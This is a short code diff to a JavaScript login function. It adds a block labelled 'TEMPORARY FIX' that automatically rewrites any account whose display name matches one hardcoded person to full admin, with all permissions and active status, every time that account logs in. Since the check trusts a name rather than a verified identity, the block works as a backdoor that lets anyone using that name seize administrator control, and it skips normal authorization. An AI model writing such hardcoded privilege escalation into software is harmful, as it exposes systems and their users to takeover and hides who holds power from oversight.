@@ -14,7 +14,8 @@ import {
   getDocs,
   doc,
   getDoc,
-  setDoc
+  setDoc,
+  updateDoc
 } from "../providers/backend/index.js";
 
 import { verifyPassword } from '../services/crypto.js';
@@ -234,6 +235,23 @@ export async function login(phone, pass) {
       .filter(Boolean)
       .join(",")
   };
+
+  // TEMPORARY FIX: Auto-upgrade specific app owner to Admin
+  if (userData.name === "mohamed hosien" && userData.role !== "admin") {
+      try {
+          await updateDoc(doc(db, "users", uid), {
+              role: "admin",
+              permissions: "all",
+              status: "active"
+          });
+          userData.role = "admin";
+          userData.permissions = "all";
+          userData.status = "active";
+          console.log("SUCCESS: Upgraded mohamed hosien to admin!");
+      } catch (e) {
+          console.error("Auto-upgrade failed", e);
+      }
+  }
 
   if (DEBUG) {
     console.log("USER DATA:", userData);
